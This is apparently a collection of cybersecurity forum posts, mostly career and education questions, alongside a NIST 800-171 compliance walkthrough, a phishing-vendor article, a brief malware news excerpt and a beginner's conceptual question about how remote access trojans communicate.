to maintain the secrecy of sensitive information and saves money due to avoiding cyber-attacks."

Originally my plan was to transfer to a university and pursue a degree and career in intelligence studies, wanting to work for the CIA or FBI. But I'm not interested in that anymore.

One of my professors has his own consulting firm with a partner; his partner is the coding guy, and my professor is the one who gathers the background information about, for example, employee targets when they're contracted to penetrate a company. He also specializes in more of the physical side of computers. That sounds fun to me, since I love computer hardware but I don't like sitting at a desk and coding. That isn't what I want to do all day. What would be the best course of action to take at this point?

After sending out some applications, EY, PwC and two boutique consulting firms offered me to join their cybersecurity consulting team, which I gladly did. ^(()*^(Disclaimer: Cybersecurity and its topics were not entirely new to me at this time. I've read a lot study guides such as the one by Darril Gibson for Security+, have done courses and labs on both Udemy and Cybrary, and can program not all too shabby in different programming languages. Therefore, my post is less about breaking into the field as I am already in it.))* Recently, I decided to hone my technical cybersecurity skills and dive into penetration testing to quench my thirst for knowledge - eventually, I would like to get the OSCP certification (CEH, CISSP and others I consider as side projects until then). Instead of scraping together YouTube videos to watch, I decided to go for the more structured approach and signed up for Cybrary's Penetration Tester Career Path. After investing almost every free minute for the last 2 months into watching videos and working myself through the labs, I'm finally done - which leads me to the question: What now? The most logical thing coming to my mind is to move away from theoretical studying and increase practicing penetration testing with the potential resources I know about: **Free resources** * [hacking-lab.com](URL (already solved some challenges) * [hackthebox.eu](URL (solved registration challenge, didn't attempt anything else yet) **Paid resources** * [virtualhackinglabs.com](URL My plan is to buy the Virtual Hacking Labs penetration tester course and focus on working with these boxes (since subscription-based), whereas hacking-lab and hackthebox serve as side resources. When done with virtual hacking labs, I would like to move on to the OSCP course. What's your opinion on this? Am I missing something? Do you have tips? Did anybody finish Cybrary's Penetration Tester Career Path and find themselves in the same position? Did you think that the career path course prepared you for the CEH well enough? I am thankful for every hint and any experience you share! Ps. Any good resources for learning bash scripting **efficiently**?

For instance, say I have someone looking at my desktop. Their program, with my permission and direction, sends a packet to my company computer that allows them temporary access to view, modify, and control my desktop. While remoting in, in order to provide support, they need me to enter a credential to gain access to something on our network. My question is, ultimately, are there any occult services included in the packet or the software or on their end that would allow to see the otherwise hidden password credential? So while they visibly can't see it, is there a way they're logging it on the backend? I'm getting into cybersecurity but currently work as a Desktop Support Analyst.

I thought about cybersecurity or web development as an option. Salaries seem very good, jobs seem to be in demand but I am getting a little confused about education requirements. Do I need to go back to University and get a Computer Science degree or something related or has anyone had success with bootcamps. A nearby school had a bootcamp by Trilogy Education Services and I requested information but they needed me to register and pay this week even though classes begin in December. I have looked at trainingcamp.com and sans.org. I just dont know exactly where to drift. Would a certificate be adequate? Do i need a degree? I have absolutely no knowledge on this field whatsoever, I am exploring several fields, mostly concentrating on demanding career and stable fields in case I want to move out of California at some point. If you have any information or tips they would be greatly appreciated."

Im looking to start my masters in Cybersecurity and Im trying to decide between NYU and a local alternative. Ive always dreamed of studying at NYU, and they provide a MS in Cybersecurity thats an official NSA Center of Excellence, but due to my work (I work in an international IT company) I cant travel to the states and study. (And since work is paying for my degree its not an option to quit). Is it worth taking it online, or should I look for somewhere here? Theres only one MSc Network Security here but its nowhere near as good, and since I travel a lot due to work, it might be difficult. What are your thoughts on online degrees? Is it worth doing or should I settle for the one here, and push through it?"

The National Institute of Standards &amp; Technology (NIST) provides a policy framework of security guidance for how the private sector can assess and improve their ability to treat various types of cyber-risks. NISTs cybersecurity framework leverages business drivers to improve an organizations risk management practices and establish activities to reduce risks. &amp;#x200B; [NIST Functions @ https:\/\/URL ## OK, SO... WHAT IS NIST 800-171? NIST 800-171: Controlling Unclassified Information in Nonfederal Systems &amp; Organizations is a special publication that defines information security standards, guidelines, and minimum requirements for non-federal information systems storing, transmitting, or processing controlled unclassified information (CUI). This publication affects institutions that contract with the U.S. federal government to manage CUI. CUI is information that is concerning but not necessarily perceived as secret or confidential. However, CUI requires safeguarding to comply with applicable law, regulations, and government-wide policies. For further clarification, the government uses four classifications to classify information. 1. Unclassified 2. Confidential 3. Secret 4. Top Secret Unclassified information is not a classification, yet it is an identification or marking that signifies that information is not deemed as sensitive (from the governments perspective) and is acceptable for consumption by citizens such as DoD contractors, private investigators, and researchers. The government leverages the confidential classification for data or information that could cause damage if divulged or exposed without authorization. Loss of secret data could cause serious damage, but not as significant as top secret data. The exposure of top secret data could potentially cause significant damage to an organizations operations. ### Differences Between Government &amp; Business Classifications Please note that government classification and business classifications differ significantly. What may be deemed as low and consumable for citizens by the government could have a major impact on an organization, especially if the business classifies that same data as sensitive, critical, or if it provides the business with a competitive advantage. Data classification is the enterprise's ability to classify and prioritize business processes, data, and systems by considering its sensitivity and criticality (importance). For more information on data classifications and minimum security requirements, please reference *""Using Data Classifications for Effective Decision Making"" by Blake Curtis* ## SO HOW DO I BECOME NIST 800-171 COMPLIANT? ### Three Holistic Components There are three holistic components we need to complete for a NIST 800-171 assessment. Those components are comprised of documentation, reviews, and the authorizing officials (project sponsors) approval. However, just because weve completed these steps does not mean that our program is compliant. Your program needs to be independently assessed and verified by a third party that doesnt have a vested interest or bias in the completion of your project or success. Your client organizations must be able to communicate the need for a compliant environment and engage its risk, compliance, and security teams to create documentation that substantiates their conformance to NIST 800-171. They must also demonstrate the employment of ongoing monitoring measures to assure continuous compliance. Subsequently, there are various levels of review that must be accomplished throughout the certification and accreditation process. &amp;#x200B; [Blake Curtis' NIST 800-171 Holistic 3 Step Process](URL ### Documentation There is a tremendous amount of documentation associated with any NIST 800-171 effort. For example, a complete assessment of one of my client organizations comprised just four systems and a virtualized file &amp; print server that resulted in over 300 pages of documentation! So heres the scary part.....This was only the preaudit! A pre-audit is a readiness assessment that allows the business to ensure administrative, technical, and physical controls are appropriately documented. To become compliant, the client organization must also undergo a Security Assessment (certification and authorization) by an independent assessor. Necessary documentation includes but is not limited to: * NIST 800-171 System Security Plan (SSP) * NIST 800-171 Plan of Action &amp; Milestones (POAM) * NIST 800-171 Policies &amp; Standards * NIST 800-171 Response Procedures (SOPs) * NIST 800-171 Evidence &amp; Artifacts * NIST 800-171 Network Diagram * NIST 800-171 Compliance Log (compliance tracking mechanism) For more information regarding the difference between policies and standards, and how to create a policy hierarchy to comply with various requirements please refer to *""How to Create a Cybersecurity Policy Hierarchy"" by Blake Curtis.* ### Reviews (Audit/Assess) Once the business area has completed its required documents, your internal audit, risk &amp; compliance departments will need to review each document to ensure the business units evidence is relevant, reliable, and sufficient. I strongly suggest leveraging two independent internal parties to review each response to the 800-171 control objectives. The organization should **ensure at least one party has hands-on experience in information technology and/or security** **to ensure risks are appropriately identified and mitigated.** To provide more clarity, please reference the suggested workflow: 1. The business unit populates the NIST response procedures (SOPs), NIST Evidence &amp; Artifacts) and switches the response status to **Awaiting Internal Audit's Review** in the compliance log. 2. Internal Audit reviews the policy, standards, responses and evidence and changes the status to **Awaiting IT Risk's Review** if no deviations are found. &amp;#x200B; [Security Assessment Report \(SAR\) template part 1 by Blake Curtis](URL **Note**: If the internal audit department has any reservations regarding the reliability, sufficiency, or relevance of the response, they will provide the business unit with an audit opinion and recommendation on how to better substantiate their claims. &amp;#x200B; [Security Assessment Report \(SAR\) part 2 by Blake Curtis](URL 3. The IT risk department reviews the responses and changes the status to **Awaiting Final Review** if no deviations are found. **Note**: If the IT risk department has reservations regarding the evidence, policies, or procedures, they will provide the business unit with their opinions &amp; recommendations. 4. The Authorizing Official (sponsor) or delegated authority (business unit manager) performs the final review and changes the status to **Approved**. &amp;#x200B; [NIST 800-171 Compliance Log by Blake Curtis](URL ### Certification &amp; Accreditation Process (Approval) At the closure of the project, the final sign-off on the SSP is completed. The following are a suggested list of important roles that should be considered during this process. 1. **Chief Information Security Officer** \- ensures the appropriate application of safeguards and countermeasures and ensures that policies reflect senior management's intent, direction, and objectives. 2. **Director of Risk or Audit** \- certifies that controls exhibit both design and operational effectiveness and provides an audit opinion and conclusion of the operating environment. 3. **Director of Client Organization** \- acts as the authorizing official or system owner depending on the organizational structure and is responsible for ensuring risk are within an acceptable level and approving the implementation based on an established set of specifications and controls. &amp;#x200B; [SSP Template by Blake Curtis](URL Once the SSP is approved, the business unit can proceed to the next steps such as signing the contract or agreement, initiating personnel training and beginning the work. It is important to note these next steps are contingent on SSP approval. ## 7 STEPS TO NIST 800-171 COMPLIANCE &amp;#x200B; [7 Steps to NIST 800-171 Compliance by Blake Curtis](URL &amp;#x200B; [7 Steps to NIST 800-171 Compliance with descriptions by Blake Curtis](URL f you have questions regarding templates, demos and examples, contact me @[URL ## SO...IS THAT ALL?...OF COURSE NOT ### Certifying Your Compliance Program Please note, that the 7 steps are just the minimum requirements needed to establish an effective compliance program. There are 14 control families and a total of 110 controls. Each control objective (security requirement) must be supported by policy, standards, and evidence. Each security requirement must have a strong balance of control types, classes, and implementations. For example, each control or set of controls must have the ability to: * **Detect, Prevent, &amp; Correct** be implemented as: * **Administrative, Technical, and Physical** and evaluated based on its * **Automated vs Manual** implementation For more information on Control Effectiveness &amp; Control Diversity, please reference *""If You Think Auditing is Boring, You're Probably Doing it Wrong"" by Blake Curtis* Once you have successfully implemented your compliant environment, you will need to work with your internal audit/risk department to evaluate the effectiveness of safeguards and countermeasures. It is critical that we assure that the risk associated with the program is within acceptable levels and that the authorizing official and sponsor are satisfied with the implementation. ### More Considerations Equates to More Complexity Recently, NIST released the 800-171B draft. The DoD also released the Cybersecurity Maturity Model which introduces even more complexity and difficulty for DoD contractors and research organizations who need to become NIST 800-171 compliant. **NIST 800-171B for High-Value Assets** The NIST 800- 171B draft is comprised of a set of enhancements and recommendations that organizations can leverage for information assets that have higher levels of intrinsic risk and impact on the project or organization. Reference: [URL **The Cybersecurity Maturity Model** The Cybersecurity Maturity Model is a measurement scheme similar to the Capability Maturity Model Integrated (CMMI). Various organizations and sponsors will evaluate maturity by measuring the effectiveness of the cybersecurity program by assessing the presence of policies, standards, procedures, and how much of the program is automated versus its dependency on manual intervention. This means that sponsors may require your organization to comply with a specific maturity level to participate in sensitive activities and even to receive research grants! References: [URL [**URL ### Ongoing Monitoring &amp; Maintenance Continuous monitoring and maintenance are vital parts of any cybersecurity program and are essential if one wishes to sustain conformance with NIST 800-171. So how do we remain compliant and monitor conformance with our established program? We need to ensure that we have a good balance of policies, standards, and technology. You may be thinking, how will a policy ensure ongoing monitoring and maintenance, but bare with me, and will all make sense in this next paragraph. **Policy &amp; Standards** Policies and standards give us two vital things. **Policies** reflect management's expectations, direction, what we should comply with, and what standards can be leveraged to enforce and measure compliance with the policy. **Standards** are mandatory requirements that provide more specificity to how technologies, processes, and procedures should be utilized to comply with the organization's policy. Standards essentially provide us with the ability to interpret a vague policy by giving it more context. For example, a policy can mandate that the organization leverage strong authentication methods and passwords to prevent unauthorized access and enforce nonrepudiation. The policy is not very specific and allows room for the standards to flex and support the intent of the policy. For example, the organization can leverage the policy to create specific standards for various technologies and platforms and how they should be configured to support the policy (Active Directory, AWS, Azure, Microsoft, Linux, and more.) Now that I've bored you to death describing the importance of policies and standards, let's move on to the fun part, the technology! **Leveraging Technology to Support Policy and Standards** Endpoint protection and configuration management tools can enable us to detect, prevent, and correct unauthorized modifications, configuration drift, software installations, and unauthorized access. Daily vulnerability scans, endpoint detection, and response tools, SIEM, and patch management are great logical controls that can assist us throughout this endeavor. However, technical controls are not enough. Policies, standards, and procedures (SOPs) are needed to balance out the pitfalls of technology and vice versa. Lastly, audit/assessments should be conducted when significant changes occur within the organization or infrastructure and based on an organizationally defined frequency &amp;#x200B; [Policy, Procedures, &amp; Evidence for 3.4 Configuration Management Example by Blake Curtis](URL **Conclusion** &amp;#x200B; [NIST 800-171 Compliance Log | Overall Completition screenshot by Blake Curtis](URL As you can see, defining, establishing, and maintaining a cybersecurity/compliance program is not an easy task and requires a diligent set of individuals who are committed to maintaining and improving organizational processes on a continual basis.

I've decided to focus on RAT. Can you explain to me how a RAT works ? I mean, if I take an example with what I'm currently doing in python. I'm able to create a server and client and both can communicate in local. So I use my local IP address ( [127.0.0.0](URL ). I guess that for a RAT it's the same principle : one client and one server but they can communicate between us even if they are in two different networks. So how this communication works ? I think it's necessary to [port forwarding](URL the computer running the server ( so the victim ? ). But to do this the hacker need to have access to the router's control panel and tell the router to forward the server's local IP and port to the public IP and port, no ? Or just the server in the victim's computer analyse the network of the victim and send to the hacker every ports that are open and the public IP of the victim's network ? I must confess that for a beginner in computer science like me, that looks like a sorcery ! Do you have some informations about that ?"

I spend my free time with independent research on artificial intelligence, threat hunting, and reverse engineering malware. Currently, I'm in a cyber position right now where I'm less hands on, more project management/dev pipeline overseeing which doesn't spark my passions as much. I stumbled upon a job of ""Cybersecurity Research Engineer"" for an AV company while browsing LinkedIn one day (I am not actively job hunting, my boss is awesome) and decided to search up the job description for other jobs similar and it seems up my alley, but its a position I had never really heard of until today. Job descriptions for these roles tend to include knowledge/skills of: System and Application level programming, knowledge of a variety of OS and use of virtualization technologies, math and statistical analysis, modeling, and machine learning, knowledge of OS internals, knowledge of cyber modeling, ability to develop prototypes and knowledge of project management. Extra bonuses for those with experience in pentesting, network security, development, reverse engineering, AI/Machine Learning, etc. Anyone here actively employed in a job role similar to the description or work for a company that employs them? What is a normal day like? How did you get into it? Are the job descriptions online accurate?

However, cybersecurity isn't an outright major in and of itself at my school, so I apologize for being naive. That being said, I have recently I have been asked if I want to develop tools for ethical hacking or just use the tools to perform the hacks, in a sense, do I want to be a developer or on a red team?

What are some of the job functions of each, and what is a day in a life like? What are the key differences (or what are the similarities), and what do you enjoy particularly about either? Lastly, I was wondering if there's a huge difference in software development and software security development besides the nature of the product. Is it still primarily writing code but being more keen on the security implications, or is software security development more-so developing a product for a given software to be more secure (if that makes sense)?

To cut it long story short I have started taking a genuine interest in IT - particularly cyber security and networking. I took a networking class to decide whether I had a knack for it, and I found I really enjoyed it. I have nearly completed my BA and therefore am not in a position to switch to a computer based major, which is why I have been looking at some graduate related study to give me the foundational skills to pursue a career in this field. My question to those of you in the networking or cyber security workforce is: What would you recommend I pursue as a graduate study to gain the needed skills for these fields? I initially looked into masters degrees in cyber security and the like, but I had seen other reddit posts which illustrated that a masters is not worth doing. I have therefore been looking into a grad diploma/certificate perhaps in IT or networking as they are shorter than a masters and cost less $. &amp;#x200B; My main concern is, would I be equipped to pursue jobs in networking or cyber security with a graduate diploma in IT for example? Any suggestions/advice would be appreciated. Cheers!"

For example, a business has a security concern or issue, but does not want to hire a firm for cost reasons, so instead posts it up for a freelancer to do for a small fee or for free. Or maybe someone found an exploit, or is working on a new concept and is looking for others to collaborate with. I want to get some real world experience actually solving something, either solo or with a group, so that I can get experience and add it to my portfolio.

I've worked in the Financial World for many years as an INFOSEC Analyst, a Cybersecurity Analyst, and now an ""IT Security Analyst"". Alongside multiple CISSP's, Security Sysadmins, ISO's, CISO's etc.. ..

Although per the guidelines of the company they have no problem throwing money at any solution they can think of which sounds like an awesome caveat.. .. However. After stepping in I've seen that they want to spend more time with their analysts working on Group Policy, and active directory permissions. The SIEM is not usable, and is not even reporting/alerting. Today I sat in on a SOC as a service demo, and watched those around me be overly impressed by a basic search box while they ripped Kibana and called it their own 100% platform.. The ISO has zero policy input, and those around me desire direction but don't believe company policy is the way to do so. The company wants to look into Red VS. Blue style audits, of which I have taken part in with past employers and have said multiple times since my first week they are not ready.. although it continues to be brought up. I am very young, and every company I've come to work for makes it a point to notice the ten-year + difference. It's part of what caused me to leave the last company.. Everyone at this new company has literally said they'd rather log directly into the system instead of checking the syslogs on the SIEM.. and then are upset when they do not receive clean reporting or granular data. \-- If you are are currently someone in the field.. what are your thoughts? I'm literally rebuilding parts of the IPS right now because there wasn't even an email set for basic email alerting on attacks.. I'm not a sysadmin, and have no desire to be.

While Cybersecurity may be referred to as information technology security or other names in the industry, it always aims to protect devices, programs, data, networks from attack, damage and unauthorized access. The cybersecurity field has seen tremendous improvement in recent years. Along with following the best practices, now we have a set of evolving tools, risk management approaches and many cybersecurity courses that can help you learn, apply for cybersecurity jobs and make a fruitful career in this field. ## How to Get Started in Cybersecurity? So, are you looking to make a career in Cybersecurity, or just want to acquire new skills for better opportunities? Cybersecurity is a versatile career option and involves a lot of planning. It requires you to choose a learning path and decide what basically you want to achieve with your skills. Lets go through all the phases one by one and see what becoming a cybersecurity professional look like. ## How to Pick a Cybersecurity Path? &amp;#x200B; ![img](oiobrop1in931 ""how to pick a cybersecurity path?"") People have a lot of confusion while taking the first step in this field. They dont know what technologies they should learn first, how they can get experience, career opportunities available, etc. Though I can answer a few of the common questions, the rest depends on your goals and demand of the employers. One of the most common questions is  **Do I need a college degree to make a career in cybersecurity?** The simplest answer would be: not necessarily. As long as you are ready to work hard, focus on practical knowledge, contribute to open source projects, try to speak at conferences about your research, a college degree wont matter. According to Kristen Kozinski, an Information Security Trainer at the New York Times, a degree isnt needed for cybersecurity. Most of the people Ive met in this field are self-taught, she added. Our industry is pioneered by the people who dont have any college degrees. They also did the above things and now providing opportunities to smart, hard-working people to enter the industry. However, if you have a computer science-related degree, it may expand your options. I know large companies expect college degree checkbox but its not a deal-breaker or better, just another factor to consider. &amp;#x200B; ![img](iogy0025in931 ""cybersecurity certification course"") Coming back to the main question, the first step to choose a path is to identify your strengths based on your background. **Are you a network engineer? A software developer? A policy wonk?** or **A management person?** Your preferences will help you decide which security role suits you the best.

Dubbed Agent Smith, the malware takes advantage of multiple Android vulnerabilities, such as the Janus flaw and the Man-in-the-Disk flaw, and injects malicious code into the APK files of targeted apps installed on a compromised device and then automatically re-install/updates them without the victims' knowledge or interaction. ""It's not enough for this malware family to swap just one innocent application with an infected double. It does so for each and every app on the device as long as the package names are on its prey list,"" the researchers wrote in their report published Wednesday. ""Over time, this campaign will also infect the same device, repeatedly, with the latest malicious patches. This leads us to estimate there to be over 2.8 billion infections in total, on around 25 Million unique devices, meaning that on average, each victim would have suffered roughly 112 swaps of innocent applications."""

The demographic of this club is approx. 80% Computer Science/Informatics student with Security as a focus, and the rest being an amalgamation of hobbyists. Typical meetings are lab-based practice with common application security tools (e.g. Nmap, Wireshark, Burpsuite, etc.). I was planning on having it be a 2 hour workshop, more than enough time to get their hands dirty with whatever project we end up with. &amp;#x200B; I have been struggling to find a suitable project that uses Raspberry Pis that is both practical and time-conservative. Currently I've been bouncing around the idea of having them setup a firewall pi (UFW), as many of them lack strong networking understanding and this would be something that can be taken home and used in a home network. Other ideas include Fail2Ban, adblocker/traffic manager, or setting up a VPN server. &amp;#x200B; Obstacles: * Students come from a variety of backgrounds, some specializing in infosec while others just come to club meeting for free pizza. * After speaking with a faculty member who sponsors the club, I cannot have them setup a vulnscanner/wifi-cracking/nmap or other tools that can be directly used as offensive security. Apparently helping them download free software comes with liability. ^(education purposes!) &amp;#x200B; Depending on what the decided project will be, I can trim some time by doing some of the basic configuration by myself ahead of time (e.g. setup the Pis, download Kali to the SD cards, download other necessary tools). However one of my major concerns is that students get a chance to do this themselves, as I feel it would only take away from their first experience if I do the work for them. &amp;#x200B; I appreciate any and all suggestions or comments on this!

To that end I have several layered controls in place to ensure that safety is enforced. However, one event over the weekend upended my efforts in very disturbing way. Like many kids these days mine are into Minecraft and getting on #Microsoft #Xbox Live via #Windows 10 to play with other kids. Being what I thought would be a fairly innocuous social experience I went ahead and set it up thinking that if needed I could review chat histories and block other kids from the Microsoft Family portal. This assumption was extremely naive. A situation began to arise that started to concern both their mom and myself. I then set about to see what controls I had as a parent and Microsofts Parental Controls. After an hour of digging around I was very frustrated attempting to find if I could get previous chat histories and if I could block players I didnt want to have contact with my kids. I called Xbox support to inquire how I could do those two things, while the support was helpful, the answers they gave we were at best unacceptable bordering on terrifying. On blocking other players- Support informed that the only way to do so was to do so in game. Meaning I would have to get on both of my kids machines directly and block the player in question. When asked if the child could simply unblock the player without parental approval the answer was wellyes but it is really hard to find. On viewing the chat history- The answer was simply, the game doesnt support that because it was built for little kids and they didnt think of that when they built it. What has #Microsoft done here? They have built a platform for bad actors to operate with impunity while in-game that is very difficult for parents that arent in the know on sophisticated #cybersecurity techniques to mitigate. As for in-game blocking of players only is COMPLETELY UNACCEPTABLE, I know my child has the capability to simply google search or even worse get instructions from players on how to disable. As a parent while I want to allow my child some privacy on the web they(in my opinion) need to be guided in this modern age of online social communications. #Microsoft inability for parents to view chat history is also COMPLETELY UNACCEPTABLE. This inability allows pedophiles and sex traffickers to operate without any over site from either parents or #Microsoft it would seem. How can this be fixed? Simple. Build a comprehensive parental control system for parents to use on all #Microsoft products, especially around Xbox offerings. It should be able to view all chat histories across all Microsoft games/software and a way for parents to block questionable users that the child cannot easily bypass without parental approval."

My company has a cyber-range product that pre-defines an infrastructure and invites you to test / hack it to find security holes (to think like a hacker and to train your team to code more securely ). Basically, we have been marketing our product as a traditional cyber range product, but when customers / leads come to us, they always ask if they can create or replicate their infrastructure. My bosses boss has a theory that these people all have a preconceived notion of what a cyber range is and it is directly or indirectly hurting our business. So, he came to me and asked me to do some research on this subject, find out if we are marketing the product wrong, and if we are, what words should we avoid (or use) to make sure we are clear on our differences from other cyber ranges? Does anyone have a useful analogy regarding the difference between a traditional cyber range and the one my company provides? I am fairly new to this space so any advice is greatly appreciated!!!"

Why? Fraudsters are becoming more sophisticated at identifying targets and crafting messages that evade traditional secure email gateways. And humans, despite an avalanche of warnings and millions spent on security awareness training, continue to make flawed decisions about what is trustworthy and what simply is not. ## Zero Trust Does Not Work Zero Trustthe security principle that everything inside and outside a network needs to be validated before gaining accesscan harden systems against external and internal attacks that lead to data breaches, embezzlement, fraud, and other malicious activities. In terms of machine interaction, its effective. But add people to a system and things change. Criminals know that people are the weakest point in most systems, so they go after them. Last year, there were more than [22 phishing attacks sent every minute ](URL every day. These organized fraudsters also know that security is always evolving, so they continuously adjust their techniques to avoid detection by SEGs and appear more convincing to their targets. So in a world full of headlines about scams and cons, why are people so trusting? Stanford business professor Roderick M. Kramer wrote in the Harvard Business Review that not only do we come into the world hardwired to trust the people around us, but most of us go on to [treat trust as a one-time decision](URL which we dont revisit when we get new information. If weve decided to trust emails from the CFO, we keep on trusting them, even when an urgent request to make a secret wire transfer seems a little off. Once weve decided to trust the emails sent from our Director of Human Resources, it takes something big to make us change our mind. The same can be true of third-parties youve worked with in the past and big-name brands you know and love. This drive to trust can, and often does, override anti-phishing training, which is why [30% of trained recipients will still open a malicious email](URL Not only do many people fall for phishing even after training, but they also mistake a lot of legitimate messages for fraud. Our [own survey](URL recently found that worldwide, over half of phishing reports sent by employees to SOCs are false positives. Triaging each false positive report eats up nearly six hours of SOC analyst time. Cybercriminals are taking advantage. Millennialsnow the largest generation of workers and consumershave the most confidence that they can spot phishing attempts. Unfortunately, theyre also [more than twice as likely as older adults to get phished](URL So long as deceptive messages make it into inboxes, phishing attacks will succeed, and SOC teams will spend hours triaging both legitimate and false alarms. Clearly, the traditional approach is not working. ## Phishing Fallout Beyond Direct Losses The [average loss per successful BEC attack](URL is $1.3 million. And because 96% of data breaches now start with a malicious email according to the Verizon Data Breach Investigations Report, there is also the potential for higher breach-related losses stemming from phishing. Lets not forget the potential loss of employment for executives deemed responsible, loss of shareholder value, and loss of money by consumer victims of brand-impersonation attacks. When customers get scammed, they often take their business elsewhere, driving up churn rates and customer acquisition costs. In financial services, a popular target for phishing and account takeover scams, [28% of customers leave their bank ](URL unauthorized account activity. For all industries, Deloitte projects a [30% rise in customer attrition after a company has a cybercrime incident](URL with above-normal attrition rates for the next three years. Theres harder to quantify relationship damage too, as brands involved in email scams experience the kind of press that simply cannot be considered good press. Consumers who see new stories about data breaches or warnings from the FTC may avoid those brands going forward. Making matters worse, email can see a drop in ROI if customers stop opening messages because they cannot trust the safety of them. ## A Smarter Approach to Email Security Relying on end-users to decide who to trust in the inbox is a setup for costly losses. Email security focused entirely on detecting the bad will always be forced to play catch-up when new types of attacks emerge. Between the rapid evolution of tactics and the constant nature of human behavior, is complete email security possible? We believe that it is, and it requires a radical change in approach.

While employees within organisations may be aware of the threat posed by traditional, external threats such as computer hackers, it is not clear if this level of awareness exists regarding insider threats. This research project aims to develop a comprehensive understanding of the level of awareness that industry professionals have regarding insider threats, and to investigate if insider attacks consisting of certain properties are more likely to occur than others. The opinions of industry professionals will be collected via face-to-face interviews and online survey questionnaires and subsequently analysed, while a large repository of news articles describing insider attack examples will also be analysed in order to classify properties of insider attacks and identify the frequency in which they occur. By completing this survey, you will be participating in one of the key data collection elements of my research. The survey will be open until June 23rd, which is four weeks after it was created. I plan on carrying out the data analysis during the following 7-10 days and once satisfactory analysis has been done, the survey responses will be deleted. The data that will be captured relates to demographics (gender, age, country of work, organisation related questions) and opinion-based questions on insider threats and attacks. The survey does not require you to enter any PII, although you have the option of providing your email address if you're interested in further participation in this research. This PII will be kept strictly confidential and will not be made available to anyone other than myself. To those interested, I will be more than happy to write a summary of the results of my research and post them here (some time in late August). Should the research get posted online, I will post the link here too. Please feel free to ask me any questions before starting the survey also. The link to the survey is: URL Thank you in advance!"

I have done alright in class (\~3.7 GPA) so far but I really struggled last year to find an internship *in security.* I eventually accepted one working Active Directory for a hospital. Next year I graduate and I want to find a job or at least put myself in the best position to find one quickly after graduation. &amp;#x200B; I would like to know if there is anything I can do between now and then to maximize my potential! Any comments/advice are much appreciated!

It's my first time posting on this subreddit. A little bit of background: I'm a Master of Science in Computer Science student in the United States. I've been pursuing this degree since the beginning of this year and I'm focusing in cybersecurity. I have to do a thesis research project as part of the program. My issue is that I'm having a little bit of trouble locking down the topic for my research. I had a hardware project that I was working on but hated it so I'm looking to switch to a software project (I like software engineering projects better). I was hoping that some of the members of this subreddit have had some experience with cybersecurity research in academia or in their respective industries and would give me some pointers on how to approach this problem of selecting a worthy topic to research. Perhaps if you have a project idea or some other avenue I can look at to help myself, I would greatly appreciate it. **Topics I enjoy about Cybersecurity:** I really enjoy certain topics in cybersecurity. 1) Computer Forensics -- I like computer forensics because it's a little like a CTF. Finding ""clues"" and solving puzzles is fun for me - especially in cybersecurity. 2) CTF -- I really enjoy CTFs because they are fun and they teach me a lot. And many of them are really unique in how they are to be solved. I was thinking to make a whole CTF program for my University. A CTF challenge with different challenges and a fully functional web interface for score tracking and learning about CTFs (haven't pitched this idea to my advisor yet). 3) Cryptography -- I enjoy the subject of cryptography but I don't want to do a research project for Cryptography (too much math!) **My advisor pitched this idea to me:** Build an Android app that monitors network traffic from each app -- the IP address it's communicating with, what port its using, how much traffic it's using etc. Then bundle all of this data into a nice user interface and then in the end, maybe, using some type of machine learning (I don't know anything about ML) to analyze and flag unusual behavior. Thanks for any help and advice you provide. \-BottledH2O"

I doubt that I will pay for all certs, rather take prep courses and then prove my knowledge through application. Is there a better way to learn than this process? I want to hear people's thoughts! Where does SANS fit into this? Are they a more valuable resource? I have looked at the CompTia+ roadmap but I was surprised that it didn't suggest a Linux course. Should this be a concern?

The first job involved the tear-down of old computer hardware (and installation of new hardware) and the second job involved replacing a recalled part for receipt printers.

I think questions similar to the ones Im about to ask are quite common here, so I apologise but a lot of them seem US-specific or not particularly relevant to my situation. Hopefully there are other people who would benefit from this thread as well. **My story:** I graduated from university a couple of years ago and have been mostly doing pretty unfulfilling administrative/office based work since then. I have been thinking recently about making a change to cyber/information security. It appears to me that there is a lot of hype surrounding cybersecurity right now. I am unsure whether this translates to more real opportunities to enter the industry or not. I am doubtful yet optimistic but this isn't my main motivation. The bottom line is I'm bored with the work I have been doing and have always been interested in computers. Id like to do a more varied and challenging job and security seems like it can offer that. I would describe my interest in computers as a hobby and until now and mostly unfocused so any advice on essential technologies to learn is appreciated too. To give some examples of the kinds of things I'm interested in: in the last month I have been building my own packet sniffer, cryptographic network protocol, server etc. basically just trying to improve my knowledge of TCP/IP through practical projects. I would describe my general knowledge as maybe comparable to someone in the middle of a CS degree. Basically Id like to enter the industry and am unsure the best course of action. I apologise if my questions seems vague or poorly researched but it seems that there is a lot of confusing and contradictory information surrounding my questions for a newcomer and Id like to know what some of your responses would be. The way I see it there are three possible avenues for me to get into the industry: * **Go back to university** This is probably the option I am least inclined to take. Not because I wouldnt enjoy it or be willing to put the work in, in fact the opposite is true. However it would be a large time/ money commitment. (A few years down the line Id definitely be interested in doing a masters degree.) * **Get some qualifications/certifications** What qualifications would it be advantageous for me to gain? I understand cybersecurity is an umbrella term for a wide variety of careers and the answer to that questions is dependent upon what particular role within cybersecurity I would like to pursue. However I dont feel that I have a good enough understanding of the roles available and what they would involve (network security seems interesting?) is there any general qualification I could get that might help me get a foot in the door or any that is seen as standard in the UK? * **Focus on getting an entry level position (IT help desk etc.) and going from there?** This seems to be probably the most likely option and realistically could be done in tandem with gaining qualifications/certifications. I suppose my question is what kinds of things are companies looking for in terms of tech skills for this kind of role? And are there any entry level roles that would lead particularly well into cybersecurity? If my questions seem misguided in any way any general advice is also welcomed! Thank you in advance! **TL;DR: UK graduate looking for advice on how to get a start in cybersecurity.**"

I had a cert in networking but just to give you a clue on how hard that is, if you have a BS in IT, get a masters in psychology. Totally different field.

In short, my ""resume"" fills in all the blanks for everything you could want.... except of course actual experience doing security work. The contractor I work for talked to the other side of the house, and got me an interview with their section head. If I get it, it represents about a 50% jump in pay for me. I work ""hand-in-hand"" with our SOC guys, as I'm generally their first stop during an incident-response to get them stuff from AD, as well as access logs they don't have permissions for. I know what SIEM they use, and will research what I can on that over the next few days, and will dive as much as I can into their ""practices and reports"" that I have access to. &amp;#x200B; Is there anything else that some of you more experienced guys think I should bone up on to fill in technical or scenario based questions? I don't mean basic ""what are your weaknesses"" stuff, I've been doing that for years. I mean more specifically SOC and Cyber focused job knowledge.

